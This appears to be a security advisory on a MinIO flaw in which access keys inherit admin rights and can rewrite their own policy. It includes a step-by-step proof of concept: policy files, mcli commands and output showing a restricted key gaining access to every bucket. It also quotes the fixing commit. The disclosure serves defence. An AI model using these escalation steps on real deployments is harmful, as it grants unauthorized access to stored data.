  "summary": "Minio unsafe default: Access keys inherit `admin` of root user, allowing privilege escalation",
  "details": "### Summary\nWhen someone creates an access key, it inherits the permissions of the parent key. Not only for \n`s3:*` actions, but also `admin:*` actions. Which means unless somewhere above in the \naccess-key hierarchy, the `admin` rights are denied, access keys will be able to simply \noverride their own `s3` permissions to something more permissive.\n\nCredit to @xSke for sort of accidentally discovering this. I only understood the implications.\n\n### Details / PoC\nWe spun up the latest version of minio in a docker container and signed in to the admin UI \nusing the minio root user. We created two buckets, `public` and `private` and created an \naccess key called `mycat` and attached the following policy to only allow access to the \nbucket called `public`.\n\n```json\n{\n \"Version\": \"2012-10-17\",\n \"Statement\": [\n  {\n   \"Effect\": \"Allow\",\n   \"Action\": [\n    \"s3:*\"\n   ],\n   \"Resource\": [\n    \"arn:aws:s3:::public\",\n    \"arn:aws:s3:::public/*\"\n   ]\n  }\n ]\n}\n```\nWe then set an alias in mc:  `mcli alias set vuln http://localhost:9001 mycat mycatiscute` \n\nAnd checked whether policy works:\n```\nA ~/c/minio-vuln mcli ls vuln\n[0001-01-01 00:53:28 LMT]     0B public/\n```\nLooks good, we believe this is how 99% of users will work with access policies.\n\nIf I now create a file `full-access-policy.json`:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::*\"\n      ]\n    }\n  ]\n}\n```\nAnd then:\n\n```sh\nA ~/c/minio-vuln mcli admin user svcacct edit --policy full-access-policy.json vuln mycat\nEdited service account `mycat` successfully.\n```\n`mycat` has escalated its privileges to get access to the entire deployment: \n```sh\nA ~/c/minio-vuln mcli ls vuln\n[0001-01-01 00:53:28 LMT]     0B private/\n[0001-01-01 00:53:28 LMT]     0B public/\n```\n\n### Impact\nA trivial privilege escalation unless the operator fully understands that they need to \nexplicitly deny `admin` actions on access keys. \n\n### Patched\n\n```\ncommit 0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776 (HEAD -\u003e master, origin/master)\nAuthor: Aditya Manthramurthy \u003cdonatello@users.noreply.github.com\u003e\nDate:   Wed Jan 31 10:56:45 2024 -0800\n\n    fix: permission checks for editing access keys (#18928)\n    \n    With this change, only a user with `UpdateServiceAccountAdminAction`\n    permission is able to edit access keys.\n    \n    We would like to let a user edit their own access keys, however the\n    feature needs to be re-designed for better security and integration with\n    external systems like AD/LDAP and OpenID.\n    \n    This change prevents privilege escalation via service accounts.\n```\n",
